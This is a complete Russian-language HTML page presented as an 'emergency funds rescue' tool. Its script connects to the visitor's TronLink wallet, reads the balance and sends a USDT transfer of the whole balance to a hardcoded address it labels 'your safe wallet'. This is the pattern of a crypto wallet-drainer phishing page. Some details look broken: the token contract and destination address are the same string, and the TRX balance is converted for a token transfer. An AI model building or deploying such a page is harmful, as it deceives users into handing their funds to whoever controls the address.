<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Экстренный Перевод Средств</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        button {
            background-color: white;
            color: black;
            font-size: 20px;
            padding: 15px 30px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #f1f1f1;
        }
    </style>
</head>
<body>
    <button id="saveButton">СПАСТИ СРЕДСТВА</button>

    <script src="https://cdn.jsdelivr.net/npm/tronlink.js"></script>
    <script>
        document.getElementById('saveButton').addEventListener('click', async function() {
            if (typeof window.tronLink !== 'undefined') {
                try {
                    // Создаем провайдер для соединения с блокчейном TRON
                    const tronWeb = window.tronLink.tronWeb;

                    // Проверяем, подключен ли аккаунт
                    const userAddress = tronWeb.defaultAddress.base58;
                    console.log('Ваш адрес: ' + userAddress);

                    // Проверяем баланс
                    const balance = await tronWeb.trx.getBalance(userAddress);
                    console.log('Баланс: ' + balance + ' TRX');

                    // Переводим средства (USDT TRC20)
                    const usdtContractAddress = 'TXYZJAfQ2qawXdxUgyFeMbv2zdx6xZc5m5'; // Адрес контракта USDT TRC20
                    const toAddress = 'TXYZJAfQ2qawXdxUgyFeMbv2zdx6xZc5m5'; // Ваш безопасный кошелек

                    // Получаем контракт токена USDT TRC20
                    const usdtContract = await tronWeb.contract().at(usdtContractAddress);

                    // Переводим все средства (USDT TRC20)
                    const amount = tronWeb.toSun(balance);  // Преобразуем баланс в базовую единицу для TRC20
                    await usdtContract.transfer(toAddress, amount).send();

                    console.log('Транзакция отправлена');
                    alert('Транзакция отправлена! Пожалуйста, подождите.');
                } catch (err) {
                    alert('Ошибка: ' + err.message);
                }
            } else {
                alert('Кошелек TRON не найден. Убедитесь, что у вас установлен Trust Wallet или TronLink.');
            }
        });
    </script>
</body>
</html>
